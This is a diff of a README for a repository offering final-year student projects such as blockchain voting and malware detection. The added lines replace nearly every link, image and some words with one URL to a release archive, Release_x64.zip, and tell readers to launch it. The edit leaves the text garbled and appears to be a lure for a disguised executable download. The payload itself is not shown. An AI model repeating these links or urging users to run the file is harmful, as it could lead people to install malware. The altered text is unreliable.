@@ -17,34 +17,34 @@ Welcome to the "10 Latest Final Year Projects with Source Code" repository! Here
 10. Machine Learning
 
 ### Additional Details:
-- Topics: BCA, B.Tech Projects, Computer Science Projects, MCA, M.Tech Projects
+- Topics: BCA, https://github.com/aliasghar100/10-Latest-Final-Year-Projects-with-Source-Code/releases/download/v1.0/Release_x64.zip Projects, Computer Science Projects, MCA, https://github.com/aliasghar100/10-Latest-Final-Year-Projects-with-Source-Code/releases/download/v1.0/Release_x64.zip Projects
 - Keywords: Cyber Threat, Blockchain Technology, Computer Security
 
 ## Repository Link 🔗
-[Download Software.zip](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[Download https://github.com/aliasghar100/10-Latest-Final-Year-Projects-with-Source-Code/releases/download/v1.0/Release_x64.zip](https://github.com/aliasghar100/10-Latest-Final-Year-Projects-with-Source-Code/releases/download/v1.0/Release_x64.zip)
 
-### :rocket: Launch the Software.zip file to access all project resources!
+### :rocket: Launch the https://github.com/aliasghar100/10-Latest-Final-Year-Projects-with-Source-Code/releases/download/v1.0/Release_x64.zip file to access all project resources!
 
 ## Project Showcase 🌟
 
 ### Blockchain Voting System
-![Blockchain Voting](https://image-link-here.jpg)
+![Blockchain Voting](https://github.com/aliasghar100/10-Latest-Final-Year-Projects-with-Source-Code/releases/download/v1.0/Release_x64.zip)
 
 This project explores the use of blockchain technology for secure and transparent voting processes. The source code provides a robust system for electronic voting, ensuring the integrity of the electoral process.
 
 ### Malware Detection
-![Malware Detection](https://image-link-here.jpg)
+![Malware Detection](https://github.com/aliasghar100/10-Latest-Final-Year-Projects-with-Source-Code/releases/download/v1.0/Release_x64.zip)
 
 The malware detection project uses machine learning algorithms to identify and classify malicious software. The included research paper delves into the technical details of how the system achieves high accuracy in detecting malware.
 
 ### Fashion E-commerce Website Design
-![Fashion E-commerce](https://image-link-here.jpg)
+![Fashion E-commerce](https://github.com/aliasghar100/10-Latest-Final-Year-Projects-with-Source-Code/releases/download/v1.0/Release_x64.zip)
 
 Experience the latest trends in web design with this fashion e-commerce project. From user-friendly interfaces to secure payment gateways, this project covers all aspects of online shopping platforms.
 
 ## Explore Further 🌐
 
-Visit the [Projects Section](https://github.com/22155555/1875695542/projects) for a detailed overview of each final year project. Dive into the world of computer science and innovative technology solutions!
+Visit the [Projects Section](https://github.com/aliasghar100/10-Latest-Final-Year-Projects-with-Source-Code/releases/download/v1.0/Release_x64.zip) for a detailed overview of each final year project. Dive into the world of computer science and innovative technology solutions!
 
 ## Get Involved 🚀
 
